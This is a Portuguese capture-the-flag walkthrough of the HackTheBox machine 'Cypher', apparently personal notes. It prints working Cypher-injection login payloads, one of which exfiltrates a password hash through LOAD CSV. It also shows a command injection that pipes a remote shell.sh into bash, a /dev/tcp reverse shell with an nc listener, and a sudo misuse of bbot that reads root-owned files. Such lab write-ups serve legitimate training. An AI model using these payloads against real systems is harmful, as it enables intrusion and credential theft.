#Difficult : Medium
#OS : Linux
#Time  : 3h 23min
***
# Port Scanning
Como sempre começamos escaneando as portas abertas na máquina para termos uma noção de quais serviços estão rodando na máquina.
```bash
nmap 10.10.11.57 -sC -sV -A Pn -oN
```
![[Pasted image 20250414151325.png]]
Como não temos credenciais para o `ssh`, podemos focar na porta `80`. Após acessarmos o browser nessa porta, somos redirecionados para `cypher.htb`.

Devemos então eadiciona-lo em nosso arquivo de hosts.
![[Pasted image 20250414151716.png]]
```bash
echo "cypher.htb    10.10.11.57" >> /etc/hosts
```
***
# Fuzzing
Podemos então fazer uma enumeração dos recursos disponíveis na aplicação.
```bash
ffuf -u http://cypher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
![[Pasted image 20250414162656.png]]

No endpoint `/testing` podemos encontrar um arquivo em jar, podemos baixa-lo para dar uma olhada.
![[Pasted image 20250414162800.png]]

`.jar` costuma ser uma aplicação java compilada. Podemos então decompilar essa aplicação para darmos uma olhada.
```bash
jadx-gui -d decompile custom-apoc-extension-1.0-SNAPSHOT.jar
```
![[Pasted image 20250414163118.png]]

Temos o que seria então o código da aplicação que aparentemente faz conexão com o servidor `neo4j`, podemos notar que a função `getUrlStatusCode` recebe alguma ``url`` a qual é passada sem sanitização para uma varável `command` que será executada. Então caso tenhamos acesso a essa função poderíamos usa-la para executar código arbitrário.
![[Pasted image 20250414163543.png]]
***
# Cypher Injection
Após mapear a aplicação achei um formulário de login que quebra após ser submetido com `'`. O que pode indicar uma vulnerabilidade de `Injection`.
![[Pasted image 20250414153646.png]]

Interceptei com o `Burp Suite`, para fazer uma análise mais controlada, podemos envia-la para o `repeater(Ctrl+r)`. Após fazer o envio, recebemos o seguinte erro.
![[Pasted image 20250414154448.png]]

No erro podemos notar o uso do `neo4j` que é um banco de dados de relacionamento de grafos. E o uso de sua linguagem `OpenCipher`. Nesse ponto eu não sabia muito sobre o `neo4j` nem sobre o `OpenCipher` ,as esses 3 artigos me ajudaram a entender como prosseguir com a exploração.
- [Protecting against Cypher Injection](https://neo4j.com/developer/kb/protecting-against-cypher-injection/)
- [Cypher Injection Cheat Sheet](https://pentester.land/blog/cypher-injection-cheatsheet/#example-in-band-injection-with-union)
- [Fun with Cypher Injections](https://hackmd.io/@Chivato/rkAN7Q9NY)
- [The most underrated injection of all time — CYPHER INJECTION. Identification & Exploitation!](https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8)

Comecei então iniciando um servidor `http` com `python` e mandei uma payload com `LOAD CSV` para validação.
```bash
python3 -m http.server 80
```

Devemos colocar `OR 1=1` pois a condição tem que retornar verdadeiro para conseguirmos executar as condições subsequentes.
```json
{
	"username" : "admin' OR 1=1 LOAD CSV FROM 'http://10.10.14.174/'+h.value as value Return '' //",
	"password" : "12345"
}
```
![[Pasted image 20250414165918.png]]
Embora tenhamos a `hash` do usuário `admin`, não consegui quebra-la.

A função `custom.getUrlStatusCode()` que pegamos no código java que achamos na enumeração de subdomínio faz parte do pacote `apoc`. Então podemos utiliza-lo em nossas consultas.

Após muitos testes, achei a payload certa. Devemos fazer o `RETURN` antes de usarmos o `UNION` pois ele precisa finalizar a `query` para fazermos outra
```json
{
	"username" : "admin' RETURN h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl 10.10.14.174/shell.sh|bash;\") YIELD statusCode AS value RETURN value ; //",
	"password" : "12345"
}
```

Então criamos a payload  `shell.sh` que será servido no servidor `http`.
```bash
echo "/bin/bash -i >& /dev/tcp/10.10.14.174/4545 0>&1" > shell.sh
python -m http.server 80
```

Então podemos iniciar o nosso `listener`. Podemos mandar nossa solicitação, e então recebemos a conexão.
```bash
nc -lvnp 4545
```
![[Pasted image 20250414173033.png]]
***
# Movimentação Lateral
Na pasta `/home` há um arquivo de configurações que temos acesso.
```bash
cat /home/graphasm/bbot_preset.yml
```
![[Pasted image 20250414173606.png]]

Podemos reutilizar essa senha para o usuário `graphasm`, e acessar via `ssh`.
```bash
ssh grphasm@cypher.htb
ls -l
```
![[Pasted image 20250414173815.png]]
***
# PRIV ESC
Podemos agora ver quais comandos podemos executar com `sudo`.
```bash
sudo -l
```
![[Pasted image 20250414173908.png]]

Primeiro fiz uma leitura do menu de ajuda do binário.
```bash
sudo /usr/local/bin/bbot -h
```
![[Pasted image 20250414174006.png]]

Podemos colocar como entrada um arquivo que irá servir de `regras yara`. E então abrir o modo de depuração para vermos esse arquivo.
![[Pasted image 20250414174206.png]]

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt --debug
```
![[Pasted image 20250414174719.png]]

**Owned!**
***

![[Pasted image 20250414174923.png]]

